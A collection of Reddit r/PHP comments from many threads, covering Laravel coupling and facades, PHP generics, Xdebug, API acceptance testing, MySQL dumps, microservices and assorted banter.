&gt; The point is that if your system is well architected then any framework will be maintainable long term. Backwards compatibility comes in to play when you depend on functionality in the frameworks current state, when you're coupled to the framework. This is a flat-out lie. If the Framework doesn't allow to decouple properly, you're forced into poor architecture. Once you are coupled with a Framework you're totally screwed. I rarely (if ever) see anyone talk/post about decoupling from Laravel, whereas I hear it from the other framework communities. If you are coupled to the Framework and it has BC breaks and those BC breaks are very expensive to fix you could be looking at a lot of effort to maintain it. If the framework has classes such as an Invoice which writes to disk and all of a sudden if you want to have invoices saved on to S3, into a database, whatever you're screwed. You're going to have trouble with that. If you have static calls all over the shot, you're going to have trouble replacing things, especially when you have classes you want it to save to S3 on some occasions and on others to email. Please refrain from lying. The Frameworks architecture can infect yours and some force that infection on to you. So if they force their architecture issues on to you, you can not have a long-lived project that is not a pain in the ass.
Nodejs is not asynchronous! It does have asynchronous I/O (network, file access) Nodejs is not async, it's underlying libraries are. Which means your business logic is always executed in one thread. Php threading is harder, Java and Python threading is mature. Using nosql is as easy in nodejs as in any other "language" (nodejs isn't a language) so there is no advantage. Real time applications ? really ? I could argue that languages which have multi threading and are able to use all the cpu's cores are better suited. Nodejs scalability - I don't see any advantage there if you have a real application with business logic. ( you will be better if your app just forwards data like a chat app) Sorry but your article is really lacking in value, I hope it doesn't misinform people that are starting out and are deciding on a technology. As a idea for improvement, try and argument every statement of pro and con between the two, do some benchmarks and share the code! 
Xdebug is not only for debugging. Its also great for development in general... Step trough functions, dump variables etc. So for me at least its not a solution to work without xdebug and as soon as I need it, change the whole environment for that.
Let's try again. Yoda conditions are part of the [Symfony Coding standards](https://symfony.com/doc/current/contributing/code/standards.html). The coding standards for WordPress are rubbish, but the standards for Symfony are pretty solid. 
When are you clowns going to stop using Macs.
They're also part of the Symfony coding standards.
In short: * Do not share any volumes over docker (docker inspect) * If you really need fast 2-way sync, decide who is the master of the data (host or container) and then use one of these: https://docs.docker.com/docker-for-mac/osxfs-caching/#tuning-with-consistent-cached-and-delegated-configurations * Install/Run SSH in Container (only in dev environment) * Let local rsync script (started on host) sync files over rsync/ssh to your container (interval 5s). Could also go faster but uses much cpu (with next point usually not needed) * Let phpstorm sync your files on save over sftp to your container (setup proper path mapping) * Install your vendors on your host system (yes, not very cool ideas since your php version is not 100% the same as on the container) * Rsync will sync the vendors to your container * Docker Preferences -&gt; 4 CPU's / 8GB RAM Cleanup script, I run from time to time: #!/usr/bin/env bash docker rmi $(docker images -q -f dangling=true) docker rm $(docker ps -q -f status=exited) 
Thanks for your feedback! Good to receive one from an experienced programmer. I didn't want to make this post overly complicated (the target audience of it are people who aren't programming professionals" but you have pointed some excellent points, that may be misleading. Will work on it, to make it more adequate.
Problem?
👏
&gt; "go f yourself" isn't just a friendly way of saying "haha, get out of here old friend!" It is in Australia.
Thanks for sharing.
It's PHP developers wanting to feel like "real developers".
#medoo
&gt; Just turn off the E_NOTICE flag. Or maybe it is an E_WARNING. Please never do this. Converting all unexpected warnings to exceptions, and then altering your code to not emit any warnings is the only sane solution.
Actually you're right :D
But Laravel's core is also built on interfaces/contracts, so you can also change your application core without being coupled to Laravel. IMO one can write code which is decoupled from Laravel and I don't think it is much harder than decoupling from Symfony
Uhh thanks I guess. Where is the PHP code?
I was just looking at the Laravel docs in the advanced section so I could see the more advanced stuff and it had static calls. That in most cases removes the point in having interfaces since you're already coupled to a class.
God you are unpleasant. I’m a much better programmer than you are. 
Note that this comes with *many* improvements for PHP; most critically support for PHP 5.5 and 7 syntax features, but also better type deduction and autocompletion.
Here's a deobfuscated version https://pastebin.com/SB4uNN1S for anyone interested in delving further (created just by renaming variables from their context) It can scan for writable directories before pulling in additional exploits from a C&amp;C server
Yes, but `NEW` won't have the type parameter because it was passed the type argument, not the type parameter.
When we generate the opcodes for `NEW`, `INSTANCEOF`, etc we know that it is parameterized which is why we can conditionally generate the `FETCH_TYPE_PARAMETER`. We can indicate to `FETCH_TYPE_PARAMETER` this usage should be a class type but I'm not sure that gives us good error messages. At best that gives us something like: &gt; Unexpected type int for type parameter T; expected class, interface, or trait name I guess that's okay. Would prefer more specific errors though. Instead of duplicating opcodes can we add a new op type and specialize it somehow..? `VAR|ZEND_TYPE` or something? I don't know how that part of the code works.
&gt; Almost all generics threads have had a guy who questioned or inquired about the usefulness of generics. Yes.....and I think those people will still have that opinion after generics have been implemented and are used by 95% of PHP programmers. 
In PHP we are used to write code that take value as arguments and return more values. Or classes that are composed of some values. Generics is an idea that we can write code that take type as arguments. Ok. That's nothing new, right. We can already pass class name as string assign it to "$class" and do stuff like "new $class()". Or we could query PHP about type of given variable with Reflection API, and once we have that type info we can do some nice stuff with it. Generics are in a sense special subset of those possible actions. Once type is known/assigned it can not change for that particular variable. Eg. once "$class" is assigned to "ClassA" it can only hold that and nothing else. In pure PHP it would be up to developer to ensure that, with Generics we get that for free. Generics can only provide nice syntactic sugar over those sometimes complex Reflection API calls. We would have new syntax for specifing such variables that will hold types for us. We would have new syntax by which users of code can declare which types they need in that moment. There would be (probably) new naming space for such variables - possibly just without "$", so "$variable" holds values, while "variable" can only hold types. You may be thinking: But if we can already have it with Reflections... Yes we can have it already, but it's up to developer to make it work. With generics PHP interpreter would be able to help developer make sure such code is actually valid PHP code. Such techniques would be so much easier. We could use them more often. We would want to use them more often. PS Technically generics are implementation of parametric polymorphism where one code can handle values of different (and unrelated) Types. Variables that hold Values, are called value-level. Variables that hold Types are called type-level. 
It fucks you up! I see these posts here once every month or so. Don't try to fix it. Destroy the server, load all php files back from the repo / original installation with verified checksum from the distributor. Don't install the same third party plugins / your same insecure code. Also, remove write permissions for the web server, read up on basic security concepts, such as cleaning input variables and SQL injection. Also change all passwords of all users who have access to that server and website and inform the users you've been hacked. 
If dog is white , then... Can never be translated into: `if ($dog == 'white') {` Because `$dog` is not a `dog` from business requirements. `$dogColor` or something else would be better, and then english version would be spoken: If color of the dog is white, then.... If white is color of the dog, then.... That do not sound that bad. * Granted, I'm not native speaker! But for if and == the thing is that we have equality, and for that order matter not. Yes, english native speakers would be baffled for say few days. But after that? I say, that after that short period of feeling uncomfortably, they would no longer notice "strangeness". Hence I think claims to contrary are urban myth. Benefits are obvious.
An upvote isn't enough for this comment. Don't try to fix it. 
I think those are facade calls, not static calls. Laravel uses facades a lot, so it could be easily mistaken as a lot of static classes.
Correctness can not be assured by other means, unless we declare assignments illegal in conditions. Your example of nested conditions is fishy. "If I cooked exactly double the numbers of cakes as pies ...." "If I cooked exactly half as many pies as cakes ...." Either is normal English, so either can be provided to a developer as requirements. As for PS: It's obvious that $productMapper design is flawed. It tries to shoehorn sentinel value into Product type. PHP do not have native mechanism to handle that. But we could use some extra library, then: $productSellerPhone = $productMapper-&gt;find($productId)-&gt;getSeller()-&gt;getPhone(); return $productSellerPhone-&gt;exists(); Return type of `find` is `Option`, `Maybe` or some similar construct.
Ok... The thing is unless Laravel has it's own php implementation, those a static calls. In php Class::Method() is a static call. It doesn't matter the magic you do behind the Method call, it removes Dependency Injection and forces coupling. This is bad. This means I can't switch over to another framework. This means I can't replace it with as much ease as I would like without using Laravel.
/u/dracony you should know better than using abstract classes. Composition over inheritance. I expect better.
Honestly, I would like to move this error even earlier. Rather than report it at the point of the `new`, instead create a constraint on the type parameter if we see that it may be used in `new` (etc) and forbid it already at the point of type instantiate. Alternatively or additionally, this could also be explicit in the form of `class Foo&lt;T: class&gt;`, if `T` must be a class parameter.
This exceeding trifling witling, considering ranting criticizing concerning adopting fitting wording being exhibiting transcending learning, was displaying, notwithstanding ridiculing, surpassing boasting swelling reasoning, respecting correcting erring writing, and touching detecting deceiving arguing during debating whether english, the world's most syntactically rubbish language, should be used as the benchmark for programming purity.
Oh, I totally misunderstood your answer, I see now what you originally meant, and I agree. Although you can replace those facade calls if you inject the services using your choice of DI, but yes this requires some work to replace all the facade calls and couples the code to Laravel.
Don't suppress your errors. Find the cause and fix them.
Error suppression in dev environments is a horrific practice. 
No
I just want to evaluate non-existent indices to empty string. Is that so wrong???
It’s a php deficiency. Many programming languages return NULL in this case.
Another solution is to disable xdebug in php.ini file, but configure PhpStorm to enable it automatically. I too was having performance issues, but with Vagrant instead, and doing this fixed my problem.
Actually not possible with php-fpm. You need to restart the whole thing. And besides: Having xdebug on should not be that big of a performance impact, that you need to disable it. For me it was actually only this firewall setting that let xdebug try to connect to blocked host for ~2s until it gave up... thanks to the firewall.
You're right, my bad. I think I had it mixed-up with debugging from the CLI.
Never trust in a developer that uses osx or win10 
Site barely usable on mobile. 2/10
There, there. Undefined variable is an error in any sane language. 
https://www.reddit.com/r/PHP/comments/3nr9d7/medoo_v10_released/ I only use libraries that are at least version 2.0 if they have no tests.
I would like to move it earlier but I don't think it is feasible. I can't think of a good example of when you would actually do this but here's a contrived one: function foo(T $t) { if (\strtolower(T::class) == "array") { return $t; } else { return new T(); } } Just because `T` is used in `new` does not mean it must be a class-like.
I've never picked up a book that talks about decoupling from any particular framework. It's not framework specific. If you're going to write shitty coupled code then the framework is irrelevant. Even your revered blog post doesn't give examples of how you're forced to couple with Laravel. He actually says that you don't have to, although it makes it easier to do so. Developing your software as a series of packages, independently of the framework, is a standard practice. Use the interfaces provided by the framework. Create interfaces to wrap them so when you save your esoteric bullshit to "email" you don't run into problems. You don't like Laravel and that's fine. But don't pretend that it's anyone's fault but your own you can't use the tool
There isn't enough content to warrant it. Use dependency injection instead of facades? Simple concept; standard practice in any framework. He doesn't event touch on that. When he does touch in dependency injection - he says it provides the tools to do it properly but most developers don't use them. Whaaaaat? Almost like it's not the frameworks fault that developers write shifty code. He's correct about AR. That's it, that's his entire blog post. There's no special training required. If you realize that something is bad then don't use it. Laravel does ship with things that allow rapid development. If that's your goal then use those things. If it's not, then use the mature and well proven methods that it provides instead.
It’s not an undefined index. On a kernel level, array memory is mapped from a pointer, then use an integer offset to compute the location of the index. Associative arrays, or hashmaps, are just arrays with numeric indices,as the hash is mapped an integer.
Sure, but in the case of a payment, the payloads are very constrained and predictable. This is the same reason unit testing API integrations is also very easy - you just mock the API abstraction and stub the methods to return deterministic responses to very specific scenarios. **But**, I'm more interested in how to test integrations that are not this constrained and simple. Integrations that are very dynamic and based on user interactions in your app. I can't, for example, just tell my QA tester to "do exactly these specific steps and verify that you get exactly this specific result in the app". That won't fly whatsoever. QA wants to poke around and do what they do, trying various scenarios, different data, and so on. This kind of ad hoc testing requires that the integration be near fully functional, so how do you mock that in a testing environment without a sandbox?
your ideas are funny bit wrong
Why not phpBAE if it’s gonna be something we fall in love with :3
I suspect PHP developers of many different experience levels are here.
I don't get it
https://i.warosu.org/data/g/img/0593/96/1489501568656.png
NOT FUNNY NOT PHP
This is just Silex with some deployment hooks.
1. Humor is subjective, who would have thought? 2. Related because people who say these type of things are the ones who bash on PHP the most 
I think we can make a "bashing node is related to php" rule 
Is she saying dev or dead?
That's pretty funny, my comment stating that humor is *subjective* got tons of downvotes. Does that mean a comment saying humor is *objective* would get tons of upvotes? 
What's the difference?
Humour is objective 
I'm not sure what part of this you're not getting, but you only need to test that you're generating the data as described in the API spec. You can, of course, end-to-end test your app, but if it fails on an integration crossing a network, then it could be a physical problem or any number of things that have nothing to do with the code you wrote.
[@taylorotwell's latest tweet](https://i.imgur.com/4cyUEpm.jpg) [@taylorotwell on Twitter](https://twitter.com/taylorotwell) - ^I ^am ^a ^bot ^| ^[feedback](https://www.reddit.com/message/compose/?to=twinkiac)
&gt; I'm not sure what part of this you're not getting, but you only need to test that you're generating the data as described in the API spec. Sorry if it wasn't clear, but I'm talking strictly about *acceptance* testing here, not unit testing. That is, testing done by an actual human being using the application. Verifying that the app is "generating the data as described in the API spec" is the responsibility of unit tests. Mocking the web service in unit tests is easy, as the inputs and outputs for each test case are necessarily hard-coded and deterministic. Mocking the web service for *acceptance* testing is not easy at all. Such a mock needs to be able to respond as the real web service would for *any arbitrary request that can be generated by the application*. I hope that explains things a bit better.
This is a somehow correct but also simplistic description. The fact that the actual code, which is sandboxed, and the framework are separated allows the Micro APIs to scale better. But so far this is not doing the system justice, there's other things to it which I'll document in further posts.
phpBAE sounds nice :) The "M" in phpMAE stands for micro, so what should "B" stand for?
You can get the hello world version of this working on any platform, it would be more interesting to see a more realistic example with some authentication, a few micro api's that communicate with each etc. In general though I do like it, I think many things are going to move towards the model of deploying functions and not worrying about infrastructure.
&gt; Sorry if it wasn't clear, but I'm talking strictly about acceptance testing here, not unit testing. No need to be sorry &gt; That is, testing done by an actual human being using the application. That right there is bad. It's always very bad! * leaves the application open to individual tester-bias * expensive and difficult to scale well Ignoring that and imagining you build a selenium or phantomJS or similar browser / UI automation. &gt; Mocking the web service for acceptance testing is not easy at all. It's a useless waste of engineering effort. There are situations where there is no way around that, but they are not common. &gt; Such a mock needs to be able to respond as the real web service would for any arbitrary request that can be generated by the application. You're familiar with modelling complexity and emulating vs simulating right? Round-trip time for a web-service being orders of magnitude higher than direct memory between function calls? This is why what you're talking about can and should only be done by adding cases to unit-tests (you can setup a provider and have one unit-test operate over an entire array of data). What makes you think a provider without a sandbox will give you enough information about their internal processes to allow you to build such a clone? You only have black box introspection. Seriously I have a half-a-decade old system that uses unit tests and has a very low error rate over billions of transactions. The development speed would grind to a halt if it had to mimic the responses of the server.
Folks need to stay far away from hidden Lair-avels
Interfaces are Contracts. Its a contract that when you say you implement something, that your code actually implements that something. Its a contract and its binding. It doesn't matter if you've not actually implemented the contract. What matters is that contract definition has been implemented. Your functions can be empty. They just need to exist so they obey the contract. Now even more important is that you yourself do not have to define any interfaces. If you are trying to use another library that provides an HTTP Request object for example.. all that should matter to you is whether or not that object provides a Request Interface. If it does, you yourself know that you can call upon that object to handle HTTP Requests. Further to this.. you can switch between any library that provides a standard Request interface without having to really change any of your code. 
Yeah, I always try to treat message boards like I do the bar after work, just being lighthearted and trying to make industry specific jokes. But there are tons of people who browse through these subs just looking for places to sound smarter than someone else.
But at the end of the day that's just trying to get a guy to admit something for the sake of admitting it. Like why does that really matter? You're basically just yelling "SAY IT!" at someone. Who really cares what he says about it? 
You can read about active record in books from the 90s though... it's not some hipster thing from 4 years ago it's a time tested well established pattern for database interaction on apps with simple database structures.
"Bitty"
Honestly all your babeling is just complaining about the docs in Laravel. I've used Laravel, Symfony and Zend (less so) and honestly in terms of getting things done its all the same thing. I could use Doctrine in Laravel if I wanted, I could inject dependencies, I could use Eloquent in Symfony if I wanted (I dont). At the end of the day it's all the same. It's just that symfony's docs don't encourage one particular way of doing things as much. Thats what your really complaining about, the way Laravels docs are written.
&gt; Devs that use it today are way behind the game. People who say things like this are almost never right. Things that are proven dont just go away. You say rails is dead but Shopify still uses it.... when have you built a bigger app than Shopify? 
This is great
OK, let's add some context and responses to all that. Disclaimer, I do like laravel, it clicks with my mind and I usually like the outlook on life and dev it's usual mafia has. (Bear with my eanglish, it's not my mothertongue) &gt; Why are all these functions global (https://laravel.com/docs/5.4/helpers)? 'Coz they are helpers... No point in helpers being more cumbersome to use than the thing they help you with. &gt; At least make them classes so they are easily testable with your code. Actually, most (I want to say all, but you never now) are just aliases to classes. `array_add` is an alias to `Arr::add`. Just mock the underlying stuff. And those functions are well tested. *Don't test what you don't own*, right ? &gt; It's also confusing and makes you wonder is this function Laravel specific or is a native function. Can't say much about that, except that good IDE helps, and that I kinda go a gut feeling now. But if you don't like it fait enough your call. Never thought it could be a bad point... &gt;Its tightly couples your code to Laravel and refactoring this to another framework or project won't be easy. Yup, using those does. But a lot of project won't ever be refactored to another framework. A lot of mine won't ever consider it. If you know it won't be asked, well, it's a moot point. Not all project need that decoupling. And if you do, well you can too &gt; More global functions: Why aren't aren't they classes so I can easily mock them for tests? Lets take the dispatch function: https://laravel.com/docs/5.4/helpers#method-dispatch. How to I test if it succeeds or fails, how do I know if my code handles this correctly? Just read the doc info box : `The dispatch helper provides the convenience of a short, globally available function, while also being extremely easy to test. Check out the Laravel testing documentation to learn more.` And the laravel docs just tells you to use `Queue::fake()` to get a fake of that queue thing... &gt; This is older and has since been changed, but this was never acceptable: https://github.com/laravel/framework/blob/5.3/src/Illuminate/Validation/Validator.php. A class with almost 3.4K lines, almost 200 methods. Actually, it wasn't really changed. Just got split in three by using [2 traits](https://github.com/laravel/framework/blob/5.5/src/Illuminate/Validation/Validator.php#L20). But it's not the point. Why do we say a long class is bad ? Because it is a god object. And what does wikipedia has to say about god object ? Nothing about length. A god object is not a problem because of length but because of knowledge. It knows and does too much. I can easilly write a 50 lines god object. In this case, all this class does is validation. Could it be splitted into validators objects, error formatter objects, etc. ? Sure. Would it be easier to work with ? I'm not sure. It's easy to understand how the class works, and most of it is `validate{Rule}` methods. &gt; One of the main faces of Laravel says that type hints, return types, interfaces and traits at "visual debt" and make code dirty? https://laracasts.com/series/php-bits/episodes/1. All of these features make your code easier to maintain, produce less bugs and make it easier to build upon. It's basically saying ignore all of the new features that other languages have and go back to PHP4 days. Few things to say to be honest on that one. It was part of a serie of screencasts, short ones, to think about things taken as granted. In essence it was YAGNI, with a bit of common sense and a voluntary devil's advocate point of view. But it was shared without context and got full viral echo chamber. Do Jeffrey Way thinks we should go back to PHP 4 ? No i'm sure he doesn't. Does he thinks sometimes devs go too far for the sake of purity, overthinking, pride (looking at your stuff and seeing dead simple code isn't the most gratifying feeling, even when it's actually what's best for the project... I'm guilty of that). It's the same kind of things than do you really need laravel (or any framework) when you are doing a 1 page stuff with a contact box ? Probably not. Do you even need pure MVC for that? It's not like you would get lost... It would even be faster without it all. And if you look into it's beginner's series on PHP, he goes into interfaces etc. &gt; They don't follow SemVer, this is nitpicking, but it would be nice. Here's a key feature was just removed (https://github.com/laravel/internals/issues/391) and not deprecated like a sane library/platform would do. I'd much rather have deprecations. mysql_* functions were terrible, but they were deprecated for a few versions of PHP and then finally removed in 7, not cut off randomly. Yeah it's a bit annoying, and was sometimes badly done. But most of the time, it's not laravel which is hard to update but the third party packages. I never had more than half a day to upgrade, and it was 5.0 to 5.4 in one go. Just waited until all packages were ready to 5.4. But yeah it one of the things to keep in mind about laravel. &gt; I'm not a fan of Facades, I feel they are scary to use because they allow you to add framework specific dependencies. Once again, framework dependencies aren't bad per se, only if you think you'll move in the future and you won't be able to replicate it. And my last project didn't use any facades, as they are an alternative to dependency injection, which is also supported as a first class citizen. &gt; Blade has dangerous features such as injecting variables from anywhere. Yeah, the one terrible things people could do anyway (as you could just write php in blade files, just open a `&lt;?php` tag), which tells you using it is a bad flag in the docs, unless you have a good reason to. &gt; Some people say it's just a tool and you don't have to use all these features. I'm one of them. &gt; But they are in the framework and are the way advertised or demoed on the site. So you are going to have junior developers coming in and you have to make sure they don't use some of these hacks. Where are they calling these global functions? Where are they injecting these variables from? Why are they injecting a repository here and querying it? If you don't want to ever have to teach your junior dev... Don't take junior dev. And I prefer a junior dev who know why he shouldn't do something (let's say global func) in a context, than a junior dev who think he can't ever use global function 'coz someone told him it's bad. --- A lot of the complains against Laravel are FUD, or 'best practice' taken out of context, or carpet bombed everywhere. And usually laravel as a nice answer built in. Facades are easilly testable, unlike what haters love to parrot. Just read the docs. Even Martin Fowler said in one of his articles service locators might be better than injections in some case. Not everyone (almost noone) work at facebook scale, even if we like to think we do. Agile, TDD, BDD, Dependency Injection Containers, whatever best practice, I'm almost sure you could find some case where those aren't usefull or even detrimental. Every tool is here to answer a need. If you don't have the need, you don't need the tool. In the end use whatever works best for you.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [laravel/framework/.../**Validator.php** (5.3 → 4ab4e5f)](https://github.com/laravel/framework/blob/4ab4e5f9470939e1c853196e1d5c84830c8b22e3/src/Illuminate/Validation/Validator.php) * [laravel/framework/.../**Validator.php#L20** (5.5 → 71dfb16)](https://github.com/laravel/framework/blob/71dfb16c7d82615f607362dc62a3942c8c6f3c88/src/Illuminate/Validation/Validator.php#L20) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dqb06hg.)^.
Yes but imho the fun fact is this example is not actually OOP. FooCollection and BarCollection have no behavior and are pretty much arrays with sexier syntax. You use another classes (processors) to give them behavior and those processor are pretty much functions processing arrays with sexier syntax. Another approach would be to put the behavior of Foo/Bar collections inside those classes. They would become encapsulated data with behavior which is the definition of OOP. Just trolling a bit.
Yes, you're right, the "Hello World" example just shows how to get something done but it's not a particularly interesting example. I have a few examples in the pipeline which I'll be sharing on the blog soon.
Not that I have to prove shit to you but I have 7 apps (all intertwined, mind) that all serve more traffic than Shopify. None of them use Laravel, not even the CRUD portions.
I'll give it a try once you have hit nesting your control structures 10 deep - nearly there!
Link?
Great post.
https://github.com/trapvincenzo/var-type-check, sorry!
Interesting, not sure if good, but definitely interesting. Missing a license file and a license in composer.json though. You should probably remove it from the readme.
Maybe not the best advice but here goes: 1. Open PHPMyAdmin 2. Export Database to a SQL file 3. Share the SQL file with colleagues
Does this not do what you need/expect? https://3v4l.org/YO8st
If you don’t have phpmyadmin installed, you can use this built in utility https://dev.mysql.com/doc/refman/5.7/en/mysqldump.html
Not sure how you're working with MySQL (command line, PHPMyAdmin, MySQL Workbench, etc.) but what you're looking for is to create a database dump file. Your groupmates can then import the file. The program / command to create the dump file is called mysqldump, https://dev.mysql.com/doc/refman/5.7/en/mysqldump.html The command to import a dump file is 'mysql -u username -p database_name &lt; file.sql' Also &gt; i usually just zipped the file and emailed it to my classmates version control is blessed if you have the time to learn it.
I go to database folder and copy the databasename.dat
The only right answer (as everyone is saying) is to use 'mysqldump' utility. Whether you do it at the command line, or with a tool like phpmyadmin, it just creates a file containing SQL that can be directly imported.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
I think it is time to seriously consider PHP-to-PHP transpling. But Is there any PHP-to-PHP transpiler project? or any polyfill transpiler? It must provide language level polyfills (for example: annotation, generics, object destructuring), not only restricted to function/class polyfills. In JavaScript world, you have babel + webpack. This is particularly useful to include non-implemented language feature. It also provides to programming language maintainer some real world stats. of use-cases of new feature through installation count. 
You seem very confused about what I'm saying, and I don't really know if it's just a communication barrier, unfamiliarity, or something else entirely. Most of your recent reply seems predicated on the (very incorrect) premise that we don't unit test the software. Acceptance testing is not something you do *instead of* other types of testing. The code in question is fully unit tested. It's also integration tested. These automated tests are all run on the CI servers *before QA ever gets their hands on the changes*. Acceptance testing happens as a last phase before a release is deployed, to ensure that all business requirements are met and that the software still functions correctly (by discoverable testing - something that can't be done using automated tests). Most often acceptance testing is performed by dedicated QA personnel, but can often include customers, beta groups, and various other people with interest in the correctness of the software. And I think it goes without saying, though I'll say it anyway, that the software obviously needs to be fully functional for acceptance testing - especially if most of its behavior depends on API integrations. And for it to be fully functional in a testing environment without affecting live data, one of two things needs to be true: 1) you have a sandbox which you can use specifically in that testing environment; or 2) you have to somehow fake the API. Given that we unfortunately don't have #1, that leaves us with only #2, and I was curious what methods other folks in this situation use.
The joke. Your head.
This is interesting but what's the point in making it optional and why not make the syntax more like what is already being used? I can setup the if condition to be optional, so I'm not sure it's necessary for this to be optional. I can just not use it or change how I use it. Instead of creating a whole new syntax `varType age expects int` why not use `variable instanceof int` or `variable is int`?
&gt; for it to be fully functional in a testing environment without affecting live data, one of two things needs to be true: 1) you have a sandbox which you can use specifically in that testing environment; or 2) you have to somehow fake the API. Given that we unfortunately don't have #1, that leaves us with only #2, and I was curious what methods other folks in this situation use. Here's where you have an incomplete picture and more incorrect assumptions that you seem unwilling or unable to relinquish. Sadly you've adopted two practices that make me not want to help you * You've adopted a tone and are now attempting to educate me (incorrectly) in several areas * You communicate something new every reply (drip feeding detail). That is an incredibly inefficient way to seek help.
You ever feel like contributing positively to something you just let us know. 
If you think you need to do this you're doing it wrong.
Sorry if it is the wrong place to ask this sort of question. I am a rookie obviously. 
Explain what type of website this is. Where is it hosted, what language does it run on, what kind of access do you have, what kind of systems (CMS) does it run on?
I just hate have to download an 4gb iso just to run lamp, and then download again once I modified a setting
I am the admin. It’s hosted on a shared server, I don’t have access to the c-panel cus it’s my brothers hosting plan I use. I use Wordpress for cms.
In some way I get your point, but you need also to consider the times you use a shared template and you don't know which variables your template expects (and if you are passing everything correctly). Of course you can check the other usages of it and extract the information needed. But having a kind of type checker like this helps with these problems and acts also as documentation. BTW I don't think there's nothing wrong on adding a layer of validation for your data.
Needs more details like full code and you should have a line number in the error message. My guess is you are missing a closing parentheses or something along those lines.
Line 6, you are missing the `if` at the beginning of your conditional.
Come on folks, it's no joke. Retract your upvotes and just report this shit as SPAM.
 (isset($_SESSION["!logged"])) { was there supposed to be an "if" in front of that? that is the unexpected bracket php is complaining about
The optional is more for those cases when you want to check the data type for variables only when are specified. In those cases of course, the templates need a `is defined` check. Eg. when the user is logged in you need 3 variables, but 1 when is not logged in. You cannot create a check if you don't make the other 2 optional. Good question btw! About the syntax, I wanted to be more based on expectations rather than direct assertion. 
Thank you! My bad, I forgot to create the licence file. I'll it asap.
Does seem to work for me
have you verified that the function actually returns a number? Are there any situations where the function might return a non number? If so you need to test for that before trying to divide it.
This is what I have: &lt;?php function testEst() { if ($_POST["maxkwhresultaat"] &gt; 0) { echo "" . $_POST['totaal'] . ""; } else { echo "" . $_POST['maxkwh'] . ""; } } $testtotaal = $_POST['totaal']; $result = testEst() / $testtotaal; echo $result; ?&gt; The function always gives out a number
This is what I have: &lt;?php function testEst() { if ($_POST["maxkwhresultaat"] &gt; 0) { echo "" . $_POST['totaal'] . ""; } else { echo "" . $_POST['maxkwh'] . ""; } } $testtotaal = $_POST['totaal']; $result = testEst() / $testtotaal; echo $result; ?&gt;
you've been asked, &gt; **have you verified that the function actually returns a number?** Di you do so? How? What was the result?
http://php.net/manual/en/function.return.php
use a text editor with PHP syntax highlighting, and a code-linter. also read the full stack trace in the error logs, it should have line numbers. 
Lol
Thanks! return $variablename; worked
In case the comment below wasn't clear, your function doesn't have a return statement, which means it returns void. You can't divide void by a number. The echo statement does not return anything. It outputs it's parameters, but that has nothing to do with the function itself. You also will want to cast your POST data to numbers just to be safe.
Name variables in English. 
either line 6 was supposed to start with `if`, or line 4 should have read: } elseif (isset($_SESSION['!logged'])) { redirection.... 
No, because I won't get proper IDE support. The IDE will think B::c returns A.
AngularJS 1.6? Really? Angular (2+) has been out for over a year now... In beta for nearly 2. No one should be building websites with Angular 1.6 in 2017—it's for legacy projects only.
I'm pretty sure it would be possible to run your own private repository but then it would be without flex bot?
You *really* shouldn't be encouraging people who don't know any better to start new projects using AngularJS in 2017. Angular (2+), React, Vue, Elm, Ember, whatever, just please don't mislead people into using a framework that's explicitly in life-support mode and has been for a while. 
This website tried running a javascript blockchain miner and this user posts nothing but links to their own site.
The fundamental problem I've encountered most often with poorly-designed microservices is thinking the concept also applies to the process &amp; network architecture. That's incredibly wasteful. I see this all the time in nodejs. In PHP it might look like each microservice having its own docker container, with its own nginx, its own php-fpm instance, and each maintaining its own connection to the database. You end up with what used to be simple procedural program flow is now dependent on multiple and completely redundant instances consuming resources and slowly talking to eachother via HTTP calls. Microservices, as an application design strategy (in OOP speak, it's simply attaining high cohesion and low coupling) can lead to very resilient and independent portions of an application, but please keep microservices out of the system architecture.
Got an avast security warning and the folder structure goes against practices recommended in the angularJS tutorial. Also, what others have said. No reason to recommend angularJS at this point. Downvotes are justified.
What is the overhead of making an http call locally over a sock?
Assuming the function call itself is identical in nature, it would be the overhead of creating creating and establishing a TCP socket, transmitting, parsing, and receiving the HTTP. Multiply that by 2x since it's happening on each side. And you're probably not making a simple raw socket connection anyway, it's probably using an underlying library like libcurl through Guzzle. This is compared to an assembler CALL in the already compiled bytecode. We can bust out some benchmarks if you'd really like to see but it's going to be a few orders of magnitude slower.
But what about scaling? If you really actually separate your microservices you can scale them independently
In the past maybe justified a bit.. today, its just ignorance. 
They hate us because we're beautiful. 
You're the best :-)
You created an account just for this?
It still amazes me how something that can be done in a few lines of code is instead done using Symphony and hundreds if not thousands of lines. Geez.
It's basically a circlejerk and nothing more.
This is great and all, but phpcs does this and more. Also, check out https://github.com/phpro/grumphp
They hate us cause they ain't us
As long as it pays my bills, who cares. 
Because PHP is not subtle in it's imperfections and most people who hate it still view it from 2005.
Nice overview! Would be cool if you did a follow up with specific examples and more specific stuff so readers can see what a microservice architecture looks like in action. 
That's just because the language itself became a meme. There is a lot of terrible PHP code written because of the insanely easy learning curve relative to other languages. I personally view this as one of its benefits, and why PHP is such a beautiful language. There are a ton of terrible articles promoting bad practices as well. People want to fit in with what's cool (NodeJS) and claim how terrible PHP is due to reasons they can't even explain themselves.
Why not? Uncle Bob once called it the accidental language. Supposedly it was originally intended to be a template language. But it grew and got more features and developed into a full language. Originally it was very C inspired, but for the web. Still to this day, it has many strange core functions that are C inspired. When it started getting OO features, it did this very poorly at first. Eventually this got much better. So now it is this strange combination of something that is well designed, but totally different from what it originally was, combined with lots ties to its' roots that don't fit the new style. Lots of people say the hate for PHP is ignorance based on how PHP used to be, and that now it is "not that bad". But why use something old that was never intended to be a real language, that has been jimmy rigged into being "not that bad", when you can use a language that was designed from the ground up to be good? The only reason people still use it is they already know frameworks or tools that are PHP based, or they already know PHP and don't want to start over with something new.
